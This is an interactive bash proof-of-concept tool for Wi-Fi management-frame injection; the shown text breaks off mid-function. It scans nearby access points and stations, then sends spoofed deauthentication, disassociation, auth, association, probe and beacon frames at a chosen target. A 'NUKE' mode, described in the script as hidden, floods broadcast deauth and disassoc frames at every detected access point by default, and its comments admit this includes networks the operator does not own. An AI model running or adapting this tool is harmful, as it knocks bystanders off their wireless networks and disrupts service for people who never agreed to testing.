#!/bin/bash
# op12-mgmt-poc.sh — interactive PoC for the OP12 cfg80211 mgmt-injection patch
#
# Flow (station mode):
#   1. detect APs/stations via typical Android/Linux facilities
#      (fresh iw scan when unassociated / cached dump + ip neigh when associated,
#       `cmd wifi list-scan-results` if a real Android shell is present)
#   2. operator selects the testing AP (or a detected station) -> TARGET LOCKED
#   3. attack menu applies to the locked target; every shot verified via
#      nl80211_inject RESULT/TXSTATUS; [V] verifies state end-to-end.
#
# Exercises the full patch surface (verified 2026-10-07, wifi-modem-seams.md):
#   arbitrary SA (own/peer/broadcast/zero), arbitrary DA/BSSID, any mgmt subtype
#   (body >=1B, frame >=25B), any action category, off-channel + 6 GHz freqs.
#
# AUTHORIZED TESTING ONLY — networks/devices you own.
# Needs: root (CAP_NET_ADMIN), nl80211_inject (found or buildable).

set -u

# NUKE mode knob values (need to live before the root re-exec: sudo env_reset
# would otherwise drop them, silently reverting scope to "all"). Overridable:
#   NUKE_SCOPE=all|own|<mac>    default all (the intent — every detected AP)
#   NUKE_PPS=<n>                default 100 initial target pps
NUKE_SCOPE=${NUKE_SCOPE:-all}
NUKE_PPS=${NUKE_PPS:-100}

# ---- locate / build the injector ------------------------------------------------
HERE=$(cd "$(dirname "$0")" && pwd)
TOOL=""
for c in "$HERE/nl80211_inject" /tmp/opencode/nl80211_inject /data/local/tmp/nl80211_inject; do
  [ -x "$c" ] || continue
  if "$c" __no_such_iface__ 5745 2>&1 | grep -q "no such iface"; then TOOL="$c"; break; fi
done
if [ -z "$TOOL" ]; then
  SRC=""
  for s in "$HERE/nl80211_inject.c" /tmp/opencode/nl80211_inject.c; do
    [ -f "$s" ] && SRC="$s" && break
  done
  if [ -n "$SRC" ] && command -v cc >/dev/null; then
    TOOL=/tmp/opencode/nl80211_inject
    cc -O2 "$SRC" -o "$TOOL" 2>/dev/null || { echo "FATAL: cannot build injector from $SRC"; exit 1; }
  else
    echo "FATAL: nl80211_inject not found and no source+compiler available"; exit 1
  fi
fi

# ---- re-exec as root if needed --------------------------------------------------
if [ "$(id -u)" -ne 0 ]; then
  if sudo -n true 2>/dev/null; then
    exec sudo env NUKE_SCOPE="$NUKE_SCOPE" NUKE_PPS="$NUKE_PPS" bash "$0" "$@"
  fi
  echo "FATAL: need root (CAP_NET_ADMIN)"; exit 1
fi

IFACE=wlan0
: "${REPEAT:=5}"

# ---- frame builders (hex) -------------------------------------------------------
fr()      { printf '%s0000%s%s%s0000%s' "$1" "$2" "$3" "$4" "$5"; }
shex()    { printf '%s' "$1" | od -An -tx1 | tr -d ' \n'; }
slen()    { printf '%s' "$1" | wc -c | tr -d ' '; }
ssid_ies(){ local s="$1"; printf '00%02x%s010882848b960c121824' "$(slen "$s")" "$(shex "$s")"; }

BC=ffffffffffff
FAKE="0a$(head -c5 /dev/urandom | od -An -tx1 | tr -d ' \n')"   # random client SA for join-floods
SELF_KICK=0

# ---- own state ------------------------------------------------------------------
own_state() {
  OWN=$(cat "/sys/class/net/$IFACE/address" 2>/dev/null | tr -d ':' || echo "")
  local link; link=$(iw dev "$IFACE" link 2>/dev/null)
  AP_BSSID=$(printf '%s\n' "$link" | sed -n 's/.*Connected to \([0-9a-f:]*\).*/\1/p' | tr -d ':')
  FREQ=$(printf '%s\n' "$link" | sed -n 's/.*freq: \([0-9]*\).*/\1/p')
  SSID=$(printf '%s\n' "$link" | sed -n 's/.*SSID: \(.*\)/\1/p')
  ASSOC=0; [ -n "$AP_BSSID" ] && ASSOC=1
}

linkstate() {
  if [ "$ASSOC" -eq 1 ]; then
    echo "  [state] $IFACE associated bssid=$AP_BSSID freq=$FREQ"
  else
    echo "  [state] $IFACE UNassociated (station mode) — off-channel TX per target freq"
  fi
}

# ---- detection ------------------------------------------------------------------
TMAC=(); TTYPE=(); TFREQ=(); TLBL=(); TSSID=()

add_tgt() { # mac type freq label ssid
  local m; m=$(echo "$1" | tr -d ':' | tr 'A-F' 'a-f')
  [ ${#m} -ne 12 ] && return
  [ "$m" = "$OWN" ] && return
  local t; for t in "${TMAC[@]:-}"; do [ "$t" = "$m" ] && return; done
  TMAC+=("$m"); TTYPE+=("$2"); TFREQ+=("$3"); TLBL+=("$4"); TSSID+=("${5:-}")
}

detect() {
  TMAC=(); TTYPE=(); TLBL=(); TFREQ=(); TSSID=()
  own_state

  # 1) associated peers on other vdevs (true "stations"; SAP/P2P-GO case)
  local dev
  for dev in $(iw dev 2>/dev/null | awk '/Interface/{print $2}'); do
    [ "$dev" = "$IFACE" ] && continue
    local mac sig
    while read -r mac sig; do
      [ -n "$mac" ] && add_tgt "$mac" station "${FREQ:-0}" "peer-on-$dev sig=${sig:-?}"
    done < <(iw dev "$dev" station dump 2>/dev/null | awk '
      /^Station /{ if (m) print m, s; m=$2; s="?" }
      /signal:/ { s=$2 } END { if (m) print m, s }')
  done

  # 2) L2 neighbors (only meaningful while associated: we have an IP)
  if [ "$ASSOC" -eq 1 ]; then
    local cidr bc
    cidr=$(ip -o -4 addr show "$IFACE" 2>/dev/null | awk '{print $4}')
    if [ -n "$cidr" ]; then
      bc=$(python3 -c "import ipaddress;print(ipaddress.ip_interface('$cidr').network.broadcast_address)" 2>/dev/null)
      [ -n "$bc" ] && command -v arping >/dev/null && arping -c 2 -w 2 -I "$IFACE" -b "$bc" >/dev/null 2>&1
      local ip mac st
      while read -r ip mac st; do
        [ -n "$mac" ] || continue
        local lbl="neighbor $ip"; [ "$ip" = "${cidr%%/*}" ] && lbl="neighbor $ip (gateway)"
        add_tgt "$mac" station "${FREQ:-0}" "$lbl [$st]"
      done < <(ip -4 neigh show dev "$IFACE" 2>/dev/null | awk '
        /lladdr/ { mac=""; for (i=1;i<=NF;i++) if ($i=="lladdr") mac=$(i+1);
                   print $1, mac, $NF }')
    fi
  fi

  # 3) AP scan — THE operator-select flow
  if [ "$ASSOC" -eq 0 ]; then
    # unassociated station: driver allows a fresh scan -> full BSS list
    echo "  scanning (unassociated station mode)..."
    iw dev "$IFACE" scan 2>/dev/null >/dev/null
  else
    # associated: qcacld denies nl80211 scan trigger (EPERM) -> cached dump only (often just our AP)
    local cached; cached=$(iw dev "$IFACE" scan dump 2>/dev/null | grep -c '^BSS')
    [ "${cached:-0}" -le 1 ] && echo "  note: associated — nl80211 scan denied (EPERM); cache is minimal."
    echo "  hint: disable Wi-Fi (or menu D) for a fresh full scan, then reselect."
  fi
  parse_bss < <(iw dev "$IFACE" scan dump 2>/dev/null)

  # 3b) Android framework scan results, if a real Android shell is available
  if command -v cmd >/dev/null; then
    parse_bss < <(cmd wifi list-scan-results 2>/dev/null | awk '
      NF>=3 { printf "BSS %s freq: %s\n\tSSID: %s\n", $1, $2, substr($0, index($0,$3)) }')
  fi
}

parse_bss() {
  local mac freq sig ssid
  while IFS=$'\t' read -r mac freq sig ssid; do
    [ -n "$mac" ] || continue
    [ "$mac" = "$OWN" ] && continue
    add_tgt "$mac" ap "${freq:-0}" "AP \"${ssid:-<hidden>}\" ${sig:-}dBm" "$ssid"
  done < <(awk '
    /^BSS / { if (m != "") emit(); m = $2; sub(/\(.*/, "", m); freq=""; sig=""; ssid=""; next }
    /freq:/   { freq = $2;   sub(/\.0$/, "", freq) }
    /signal:/ { sig  = $2 }
    /SSID:/   { s = $0; sub(/^[ \t]*SSID:[ \t]*/, "", s); ssid = s }
    END { if (m != "") emit() }
    function emit() { print m "\t" freq "\t" sig "\t" ssid }
  ' 2>/dev/null)
}

# ---- target list / lock ---------------------------------------------------------
print_targets() {
  echo
  echo "=========== DETECTED TARGETS ==========="
  local i
  for i in "${!TMAC[@]}"; do
    printf '  %2d) [%-7s] %s  freq=%-6s %s\n' "$((i+1))" "${TTYPE[$i]}" "${TMAC[$i]}" "${TFREQ[$i]}" "${TLBL[$i]}"
  done
  printf '  %2d) [manual ] enter MAC yourself\n' "$((${#TMAC[@]}+1))"
  echo "========================================"
}

lock_target() {
  local i=$(( $1 - 1 ))
  LOCK_MAC=${TMAC[$i]}; LOCK_TYPE=${TTYPE[$i]}; LOCK_FREQ=${TFREQ[$i]}
  LOCK_LBL=${TLBL[$i]}; LOCK_SSID=${TSSID[$i]:-}
  if [ -z "${LOCK_FREQ:-}" ] || [ "$LOCK_FREQ" = 0 ]; then
    LOCK_FREQ=$FREQ
    if [ -z "$LOCK_FREQ" ]; then
      printf '  target freq unknown — enter MHz: '; read -r LOCK_FREQ
    fi
  fi
  SELF_KICK=0
  [ "$LOCK_TYPE" = ap ] && [ "$LOCK_MAC" = "${AP_BSSID:-}" ] && SELF_KICK=1
  # AP context for attacks: locked AP itself, else our associated AP
  AP_CTX=$LOCK_MAC; [ "$LOCK_TYPE" != ap ] && AP_CTX=${AP_BSSID:-}
  echo
  echo "  ######## TARGET LOCKED ########"
  echo "  mac=$LOCK_MAC type=$LOCK_TYPE freq=$LOCK_FREQ"
  echo "  ($LOCK_LBL)  fake-client=$FAKE"
  [ $SELF_KICK -eq 1 ] && echo "  ** THIS IS OUR AP — kick attacks disconnect this device (~1s blip) **"
  echo "  ###############################"
}

lock_select() { # one+ 1-based indices (any order, comma/space list) -> spoof set + lock first
  local x j m f dup first=0 d
  NUKE_MAC=(); NUKE_FREQ=(); NUKE_TYPE=(); NUKE_SSID=()
  for x in "$@"; do
    [[ "$x" =~ ^[0-9]+$ ]] || continue
    [ "$x" -ge 1 ] && [ "$x" -le "${#TMAC[@]}" ] || continue
    j=$((x-1)); m=${TMAC[$j]}; dup=""
    for d in "${NUKE_MAC[@]:-}"; do [ "$d" = "$m" ] && { dup=1; break; }; done
    [ -n "$dup" ] && continue
    [ "$first" -eq 0 ] && first=$x
    f=${TFREQ[$j]}
    if [ -z "$f" ] || [ "$f" = 0 ]; then f=${FREQ:-5745}; fi
    NUKE_MAC+=("$m"); NUKE_FREQ+=("$f"); NUKE_TYPE+=("${TTYPE[$j]}"); NUKE_SSID+=("${TSSID[$j]:-}")
  done
  [ "${#NUKE_MAC[@]}" -gt 0 ] || { echo "  ? nothing valid selected"; return 1; }
  sort_spoof_set
  lock_target "$first"
  echo "  [multi] scheduled burst set: ${#NUKE_MAC[@]} target(s) -> ${NUKE_MAC[*]}"
  return 0
}

read_lock() {
  detect; print_targets
  local sel
  while true; do
    printf 'Select target [1-%d, comma=multi, S<pattern>=SSID match, M=manual, R=rescan, D=disconnect-hint]: ' "$((${#TMAC[@]}+1))"
    read -r sel || exit 0
    case "$sel" in
      R|r) detect; print_targets;;
      D|d)
        echo "  Full scan needs Wi-Fi DISABLED while associated (nl80211 scan = EPERM here)."
        echo "  If on a real Android shell: 'svc wifi disable' ... reenable with 'svc wifi enable'."
        echo "  WARNING: disabling Wi-Fi drops any session riding wlan0 (incl. this tool's own link)."
        if command -v svc >/dev/null; then
          printf '  run svc wifi disable now? [y/N]: '; read -r yn
          [ "$yn" = y ] || continue
          svc wifi disable; sleep 3; own_state; detect; print_targets
        fi;;
      M|m)
        local mac freq lbl ssid
        printf '  MAC (aa:bb:cc:dd:ee:ff): '; read -r mac
        printf '  freq MHz [%s]: ' "${FREQ:-5745}"; read -r freq; freq=${freq:-${FREQ:-5745}}
        printf '  label: '; read -r lbl
        printf '  SSID (for beacon/probe-resp spoof, blank=none): '; read -r ssid
        add_tgt "$mac" ap "$freq" "${lbl:-manual}" "$ssid"
        lock_select "${#TMAC[@]}"; return;;
      S*|s*)
        local pat=${sel#?} force_re="" p
        # matcher: leading '~' or any regex-only metachar (. ^ $ + | ( ) { }) -> ERE
        # regex, otherwise bash glob (so 'test_ap_*' behaves like a wildcard)
        if [ "${pat:0:1}" = "~" ]; then force_re=1; pat=${pat#~}
        elif [[ "$pat" =~ [.^$+|(){}] ]]; then force_re=1; fi
        if [ -z "$pat" ]; then
          echo "  ? usage: S<pattern>  glob SSID match, e.g. SThe Mill* / Stest_ap_* ;"
          echo "    or S<regex> if it contains regex metachars, e.g. S^test_ap_ (SD?_vendor); S~<regex> forces ERE."
        else
          local hits=()
          for p in "${!TMAC[@]}"; do
            local hit_ssid=${TSSID[$p]}
            [ -n "$hit_ssid" ] || continue
            if [ -n "$force_re" ]; then
              [[ "$hit_ssid" =~ $pat ]] || continue
            else
              [[ "$hit_ssid" == $pat ]] || continue
            fi
            hits+=("$((p+1))")     # same array of target IDs as comma-select feeds to lock_select
          done
          if [ "${#hits[@]}" -eq 0 ]; then
            echo "  ? no detected target SSIDs match '$pat'"
          else
            echo "  [match] ${#hits[@]} target(s) match '$pat' -> ids: ${hits[*]}"
            lock_select "${hits[@]}" && return
          fi
        fi;;
      *)
        local -a tok=(); read -ra tok <<<"${sel//,/ }"
        if [ "${#tok[@]}" -gt 0 ]; then
          local esc=0 t
          # single entry that is the "manual" slot -> route to M
          if [ "${#tok[@]}" -eq 1 ] && [[ "${tok[0]}" =~ ^[0-9]+$ ]] && [ "${tok[0]}" -eq "$((${#TMAC[@]}+1))" ]; then sel=M; continue; fi
          for t in "${tok[@]:-}"; do
            if ! [[ "$t" =~ ^[0-9]+$ ]] || [ "$t" -lt 1 ] || [ "$t" -gt "${#TMAC[@]}" ]; then esc=1; break; fi
          done
          if [ "$esc" -eq 0 ]; then lock_select "${tok[@]}" && return; fi
          echo "  ? invalid selection (use 1-${#TMAC[@]}, comma-separated for multiple)"
        else
          echo "  ? invalid choice"
        fi;;
    esac
  done
}

# ---- fire -----------------------------------------------------------------------
fire() { # label hexframe count freq
  local lbl="$1" hex="$2" n="${3:-$REPEAT}" f="${4:-$LOCK_FREQ}"
  printf '  -> %-48s x%-3s freq=%s\n' "$lbl" "$n" "$f"
  local ok=0 ack=0 err="" out i
  for ((i=1; i<=n; i++)); do
    out=$("$TOOL" "$IFACE" "$f" "$hex" 2>&1)
    if grep -qE 'accepted for TX|ACK \(accepted\)' <<<"$out"; then ok=$((ok+1));
    else err=$(grep -oE 'error -[0-9]+ \([^)]*\)|bad hexframe|no such iface.*' <<<"$out" | head -1); fi
    grep -q 'ACK=yes' <<<"$out" && ack=$((ack+1))
    sleep 0.2
  done
  if [ "$ok" -eq 0 ]; then printf '     REJECTED 0/%s: %s\n' "$n" "${err:-?}"
  else printf '     accepted %s/%s   fw-completion(ACK=yes) %s/%s\n' "$ok" "$n" "$ack" "$n"; fi
  linkstate
}

DO_COUNT() { local r=""; printf '  frames [default %s]: ' "$REPEAT" >&2; read -r r; echo "${r:-$REPEAT}"; }
READ_CLIENT() { # returns directed-client MAC for AP targets
  local c=""; printf '  client MAC to hit [%s]: ' "$FAKE" >&2; read -r c
  c=${c:-$FAKE}; c=$(echo "$c" | tr -d ':' | tr 'A-F' 'a-f')
  echo "$c"
}

# ---- attacks: type-aware --------------------------------------------------------
TSSID_EFF() { if [ "$LOCK_TYPE" = ap ] && [ -n "${LOCK_SSID:-}" ]; then echo "$LOCK_SSID"; else echo "$SSID"; fi; }

atk_deauth1() { # 1: AP -> clients   (ap: BCAST from locked AP | station: directed to target)
  local n; n=$(DO_COUNT)
  if [ "$LOCK_TYPE" = ap ]; then
    fire "deauth BCAST from AP (SA=$LOCK_MAC DA=bcast)" "$(fr c000 $BC $LOCK_MAC $LOCK_MAC 0700)" "$n"
  else
    fire "deauth AP->STA (SA=$AP_CTX DA=$LOCK_MAC)" "$(fr c000 $LOCK_MAC $AP_CTX $AP_CTX 0700)" "$n"
  fi
}
atk_deauth2() { # 2: directed hit (ap: AP->given client | station: STA->AP reverse)
  local n; n=$(DO_COUNT)
  if [ "$LOCK_TYPE" = ap ]; then
    local cli; cli=$(READ_CLIENT)
    fire "deauth AP->client $cli (SA=$LOCK_MAC)" "$(fr c000 $cli $LOCK_MAC $LOCK_MAC 0700)" "$n"
  else
    fire "deauth STA->AP (SA=$LOCK_MAC DA=$AP_CTX)" "$(fr c000 $AP_CTX $LOCK_MAC $AP_CTX 0700)" "$n"
  fi
}
atk_disassoc1() {
  local n; n=$(DO_COUNT)
  if [ "$LOCK_TYPE" = ap ]; then
    fire "disassoc BCAST from AP (SA=$LOCK_MAC)" "$(fr a000 $BC $LOCK_MAC $LOCK_MAC 0800)" "$n"
  else
    fire "disassoc AP->STA (SA=$AP_CTX DA=$LOCK_MAC)" "$(fr a000 $LOCK_MAC $AP_CTX $AP_CTX 0800)" "$n"
  fi
}
atk_disassoc2() {
  local n; n=$(DO_COUNT)
  if [ "$LOCK_TYPE" = ap ]; then
    local cli; cli=$(READ_CLIENT)
    fire "disassoc AP->client $cli (SA=$LOCK_MAC)" "$(fr a000 $cli $LOCK_MAC $LOCK_MAC 0800)" "$n"
  else
    fire "disassoc STA->AP (SA=$LOCK_MAC DA=$AP_CTX)" "$(fr a000 $AP_CTX $LOCK_MAC $AP_CTX 0800)" "$n"
  fi
}
atk_probe() {
  local n; n=$(DO_COUNT); local s; s=$(TSSID_EFF); local sa=$LOCK_MAC
  [ "$LOCK_TYPE" = ap ] && sa=$FAKE
  fire "probe-req flood SSID=\"$s\" (SA=$sa)" "$(fr 4000 $BC $sa $BC "$(ssid_ies "$s")")" "$n"
}
atk_auth() {
  local n; n=$(DO_COUNT); local sa=$LOCK_MAC da=$AP_CTX
  [ "$LOCK_TYPE" = ap ] && { sa=$FAKE; da=$LOCK_MAC; }
  fire "auth flood as $sa -> $da" "$(fr b000 $da $sa $da 000000010000)" "$n"
}
atk_assoc() {
  local n; n=$(DO_COUNT); local s; s=$(TSSID_EFF); local sa=$LOCK_MAC da=$AP_CTX
  [ "$LOCK_TYPE" = ap ] && { sa=$FAKE; da=$LOCK_MAC; }
  fire "assoc-req flood as $sa -> $da SSID=\"$s\"" "$(fr 0000 $da $sa $da "04010a00$(ssid_ies "$s")")" "$n"
}
atk_pub()     { local n; n=$(DO_COUNT); fire "public action cat=04 -> $LOCK_MAC"    "$(fr d000 $LOCK_MAC $LOCK_MAC $LOCK_MAC 0409deadbeef4f503132504f43)" "$n" $LOCK_FREQ; }
atk_vendor()  { local n; n=$(DO_COUNT); fire "vendor action cat=7f OP12POC -> $LOCK_MAC" "$(fr d000 $LOCK_MAC $LOCK_MAC $LOCK_MAC 7fdeadbeef4f503132504f43)" "$n" $LOCK_FREQ; }
atk_nonpub()  { local n; n=$(DO_COUNT); fire "non-public action cat=00 -> $LOCK_MAC" "$(fr d000 $LOCK_MAC $LOCK_MAC $LOCK_MAC 0000000000)" "$n" $LOCK_FREQ; }
atk_beacon()  { # 11: ap = impersonate locked AP | station = probe-resp w/ our AP bssid
  local n; n=$(DO_COUNT); local s; s=$(TSSID_EFF)
  if [ "$LOCK_TYPE" = ap ]; then
    fire "beacon spoof (BSSID=SA=$LOCK_MAC SSID=\"$s\")" "$(fr 8000 $BC $LOCK_MAC $LOCK_MAC "000000000000000064000401$(ssid_ies "$s")")" "$n" $LOCK_FREQ
  else
    fire "probe-resp spoof -> bcast BSSID=$AP_CTX" "$(fr 5000 $BC $LOCK_MAC $AP_CTX "000000000000000064000401$(ssid_ies "$s")")" "$n" $LOCK_FREQ
  fi
}
atk_custom()  { local hex=""; printf '  hex frame: '; read -r hex; local n; n=$(DO_COUNT); fire "custom frame" "$hex" "$n"; }

atk_verify() {
  echo "  --- end-to-end state ---"
  local l; l=$(iw dev "$IFACE" link 2>/dev/null | head -1)
  echo "  link: ${l:-<none>}"
  local ip4; ip4=$(ip -o -4 addr show "$IFACE" | awk '{print $4}')
  echo "  addr: ${ip4:-<none (unassociated or no DHCP)>}"
  if [ -n "$ip4" ]; then
    local gw; gw=$(ip route show table all 2>/dev/null | awk '/default.*dev '"$IFACE"'/{print $3; exit}')
    [ -z "$gw" ] && gw=192.168.1.1
    # -I: root (uid 0) falls in Tailscale's uidrange 0-10101 → LAN dests route via
    # tun1/table1033 (192.168.1.0/24 subnet route) instead of wlan0; bind fixes it.
    ping -c2 -W2 -I "$IFACE" "$gw" >/dev/null 2>&1 && echo "  gw ping ($gw): OK" || echo "  gw ping ($gw): FAIL"
  fi
  echo "  target neigh: $(ip -4 neigh show 2>/dev/null | grep -i "$LOCK_MAC" || echo "(no live entry)")"
  local cmac; cmac=$(echo "$LOCK_MAC" | sed 's/../&:/g;s/:$//')
  echo "  target BSS: $(iw dev "$IFACE" scan dump 2>/dev/null | grep -A3 "^BSS $cmac" | grep -o 'last seen.*' || echo 'not in scan cache')"
}

atk_info() { cat << INFO
  Patch capabilities (verified 2026-10-07, wifi-modem-seams.md):
   - every mgmt subtype accepted (frame >=25B); data/null/QoS = EINVAL (mgmt-only path)
   - SA/DA/BSSID fully arbitrary: own / peer / broadcast / zero all pass cfg80211
   - any action category; off-channel + 6GHz accepted (implicit ROC; OFFCHAN flag optional)
   - FRAME_TX_STATUS ACK flag = firmware completion, NOT a literal 802.11 ACK
     (only unicast-to-AP completions carry real ACK meaning)
   - auth subtype: accepted but silent (no TXSTATUS) — on-air status unknown
   - tool frame cap 1600B; needs CAP_NET_ADMIN; associated nl80211 scan = EPERM (qcacld)
INFO
}

# ===================== NUKE MODE — hidden destructive demo set =====================
# Promiscuous, persistent, live-until-killed: spoofs every detected AP and fires
# wildcard FF:FF:FF:FF:FF deauth + disassoc so all clients of those BSSIDs drop off.
# Trigger: type NUKE (instead of YES) at the arm prompt. NOT a safe mode by design —
# it hits every BSSID in the spoof set, including networks you do not own. This is
# the impact demonstration (CVSS / WPA3-PMF need case): an unauthenticated, spoofed-SA
# broadcast-management flood from a stock Wi-Fi 7 (WCN7850) client. 802.11w / WPA3
# PMF is precisely the mitigation that stops unauthenticated deauth.
# Also serves as an explicit "hidden" second example set for the report.
#
#   NUKE_SCOPE = all | own | <mac>      restrict the spoof set (default all)
#   NUKE_PPS   = <n> initial target pps (default 100; +/-10 % while live)
# Uses the injector's --fast (fire-and-forget) path + EPOCHREALTIME deadline pacing,
# so actual pps is bounded by firmware TX rate, not by this script (see status line).

NUKE_SCOPE=${NUKE_SCOPE:-all}
NUKE_PPS=${NUKE_PPS:-100}

frv() { printf -v FRV '%s0000%s%s%s0000%s' "$1" "$2" "$3" "$4" "$5"; }  # frame -> FRV

nuke_stn_count() { NUKE_STN=0; local i; for i in "${!TMAC[@]}"; do
  [ "${TTYPE[$i]}" = station ] && NUKE_STN=$((NUKE_STN+1)); done; }

nuke_build() { # spoof set from TMAC* (all/own/<mac>), parallel arrays, sorted by freq
  local i f m
  NUKE_MAC=(); NUKE_FREQ=(); NUKE_TYPE=(); NUKE_SSID=()
  case "$NUKE_SCOPE" in
    all)
      for i in "${!TMAC[@]}"; do
        [ "${TTYPE[$i]}" = ap ] || continue
        f=${TFREQ[$i]}
        if [ -z "$f" ] || [ "$f" = 0 ]; then f=${FREQ:-5745}; fi
        NUKE_MAC+=("${TMAC[$i]}"); NUKE_FREQ+=("$f"); NUKE_TYPE+=(ap); NUKE_SSID+=("${TSSID[$i]:-}")
      done
      [ -n "${AP_BSSID:-}" ] && [ "${#NUKE_MAC[@]}" -eq 0 ] && { NUKE_MAC+=("$AP_BSSID"); NUKE_FREQ+=("${FREQ:-5745}"); NUKE_TYPE+=(ap); NUKE_SSID+=(""); };;
    own)
      [ -n "${AP_BSSID:-}" ] && { NUKE_MAC+=("$AP_BSSID"); NUKE_FREQ+=("${FREQ:-5745}"); NUKE_TYPE+=(ap); NUKE_SSID+=(""); };;
    *)
      m=$(echo "$NUKE_SCOPE" | tr -d ':' | tr 'A-F' 'a-f')
      [ ${#m} -eq 12 ] && { NUKE_MAC+=("$m"); NUKE_FREQ+=("${FREQ:-5745}"); NUKE_TYPE+=(ap); NUKE_SSID+=(""); };;
  esac
  [ "${#NUKE_MAC[@]}" -gt 0 ] || return 1
  sort_spoof_set
  return 0
}

nuke_refresh() { # live rescan (no arping — cheap): BSS cache + known neighbors
  own_state
  TMAC=(); TTYPE=(); TFREQ=(); TLBL=(); TSSID=()
  parse_bss < <(iw dev "$IFACE" scan dump 2>/dev/null)
  if [ "$ASSOC" -eq 1 ]; then
    local ip mac st
    while read -r ip mac st; do
      [ -n "$mac" ] || continue
      add_tgt "$mac" station "${FREQ:-0}" "neighbor $ip [$st]"
    done < <(ip -4 neigh show dev "$IFACE" 2>/dev/null | awk '
      /lladdr/ { mac=""; for (i=1;i<=NF;i++) if ($i=="lladdr") mac=$(i+1); print $1, mac, $NF }')
  fi
  nuke_stn_count
  nuke_build || return 1   # keep previous set if scan cache is empty
  return 0
}

nuke_listing() {
  local i naps=0 nstn=0
  echo
  echo "  === NUKE target set (scope=$NUKE_SCOPE) ==="
  echo "  -- APs detected (spoof candidates) --"
  for i in "${!TMAC[@]}"; do
    [ "${TTYPE[$i]}" = ap ] || continue
    naps=$((naps+1))
    printf '     %s freq=%-5s %s\n' "${TMAC[$i]}" "${TFREQ[$i]}" "${TLBL[$i]}"
  done
  echo "  -- stations detected --"
  for i in "${!TMAC[@]}"; do
    [ "${TTYPE[$i]}" = station ] || continue
    nstn=$((nstn+1))
    printf '     %s %s\n' "${TMAC[$i]}" "${TLBL[$i]}"
  done
  [ "$nstn" -eq 0 ] && printf '     (none in arp/peer cache)\n'
  echo "  spoof set: ${#NUKE_MAC[@]} BSSID(s) -> wildcard deauth+disassoc"
}

nuke_mode() {
  local budget=${1:-0} mode_txt
  mode_txt="persistent promiscuous deauth/disassoc flood"
  [ "$budget" -gt 0 ] && mode_txt="bounded ${budget}-frame promiscuous deauth/disassoc burst"
  echo "======================================================================"
  echo "  N U K E   M O D E  -- $mode_txt"
  echo "======================================================================"
  echo "  Spoofs every detected AP and fires wildcard FF:FF:FF:FF:FF deauth +"
  echo "  disassoc $( [ "$budget" -gt 0 ] && echo "for $budget frames" || echo "until killed (q / Ctrl-C)" )."
  echo "  ALL stations in range of any spoofed BSSID are forced off --"
  echo "  including networks you do NOT own. Purposely NOT safe. Authorized"
  echo "  research only (impact/CVSS evidence and the WPA3/802.11w-PMF need case)."
  echo "======================================================================"
  own_state
  detect
  nuke_stn_count
  nuke_build || { echo "  no APs usable as spoof targets (empty scan cache)."; exit 1; }
  nuke_listing
  trap 'echo; echo "  [NUKE] aborted during countdown."; exit 130' INT
  printf '  firing in 3s at %s pps (q=abort; +/- or =/_ adjust target while live, s=rescan): ' "$NUKE_PPS"
  local a=""
  read -r -t 3 -n 1 a || true
  if [ "${a:-}" = q ] || [ "${a:-}" = Q ]; then echo; trap - INT; echo "  [NUKE] aborted."; exit 0; fi
  echo
  SCHED_SCOPE=nuke; SCHED_BUILDER=bld_nuke
  sched_run "$budget" "$NUKE_PPS" "NUKE $( [ "$budget" -gt 0 ] && echo "burst (${budget} frames)" || echo "perpetual flood" )"
  echo "  [NUKE] nuke ended."
  exit 0
}

# ---- scheduler engine: deadline-paced rotation over the spoof set -----------------
# Generic: operates on the parallel spoof arrays NUKE_MAC/NUKE_FREQ/NUKE_TYPE/NUKE_SSID.
# Frame content comes from $SCHED_BUILDER (a function name), called as
#     $SCHED_BUILDER <idx> <mac> <freq> <tog>     -> sets FRV (tog alternates 0/1)
# sched_run <budget> <pps> <title> : budget=0 = infinite (q / Ctrl-C stops).
#   Env: SCHED_DRY=1 -> count frames without transmitting (zero-RF benchmark).
SCHED_SCOPE=${SCHED_SCOPE:-}
SCHED_BUILDER=${SCHED_BUILDER:-bld_nuke}

sort_spoof_set() { # reorder parallel spoof arrays by freq (channel-sticky rotation)
  [ "${#NUKE_MAC[@]}" -le 1 ] && return
  local pairs=() sorted=() i j nm=() nf=() nt=() ns=()
  for i in "${!NUKE_MAC[@]}"; do pairs+=("${NUKE_FREQ[$i]}:${NUKE_TYPE[$i]}:${NUKE_MAC[$i]}:$i"); done
  mapfile -t sorted < <(printf '%s\n' "${pairs[@]}" | sort -t: -k1,1n)
  for i in "${sorted[@]}"; do
    j=${i##*:}
    nm+=("${NUKE_MAC[$j]}"); nf+=("${NUKE_FREQ[$j]}"); nt+=("${NUKE_TYPE[$j]}"); ns+=("${NUKE_SSID[$j]:-}")
  done
  NUKE_MAC=("${nm[@]}"); NUKE_FREQ=("${nf[@]}"); NUKE_TYPE=("${nt[@]}"); NUKE_SSID=("${ns[@]}")
}

bld_nuke() { # idx mac freq tog — wildcard deauth(0700)/disassoc(0800) from that BSSID
  if [ "$4" -eq 0 ]; then frv c000 $BC "$2" "$2" 0700; else frv a000 $BC "$2" "$2" 0800; fi
}

bld_sched() { # idx mac freq tog — build the SCHED_MODE attack frame for that target
  local i=$1 m=$2 s
  local t=${NUKE_TYPE[$i]} ssid=${NUKE_SSID[$i]:-}
  case "$SCHED_MODE" in
    1)  if [ "$t" = ap ]; then frv c000 $BC "$m" "$m" 0700; else frv c000 "$m" "${AP_CTX:-$BC}" "${AP_CTX:-$BC}" 0700; fi;;
    2)  if [ "$t" = ap ]; then frv c000 "${SCHED_CLI:-$FAKE}" "$m" "$m" 0700; else frv c000 "${AP_CTX:-$BC}" "$m" "${AP_CTX:-$BC}" 0700; fi;;
    3)  if [ "$t" = ap ]; then frv a000 $BC "$m" "$m" 0800; else frv a000 "$m" "${AP_CTX:-$BC}" "${AP_CTX:-$BC}" 0800; fi;;
    4)  if [ "$t" = ap ]; then frv a000 "${SCHED_CLI:-$FAKE}" "$m" "$m" 0800; else frv a000 "${AP_CTX:-$BC}" "$m" "${AP_CTX:-$BC}" 0800; fi;;
    5)  s=$ssid; [ -z "$s" ] && s=$SSID
        if [ "$t" = ap ]; then frv 4000 $BC $FAKE $BC "$(ssid_ies "$s")"; else frv 4000 $BC "$m" $BC "$(ssid_ies "$s")"; fi;;
    6)  if [ "$t" = ap ]; then frv b000 "$m" $FAKE "$m" 000000010000; else frv b000 "${AP_CTX:-$BC}" "$m" "${AP_CTX:-$BC}" 000000010000; fi;;
    7)  s=$ssid; [ -z "$s" ] && s=$SSID
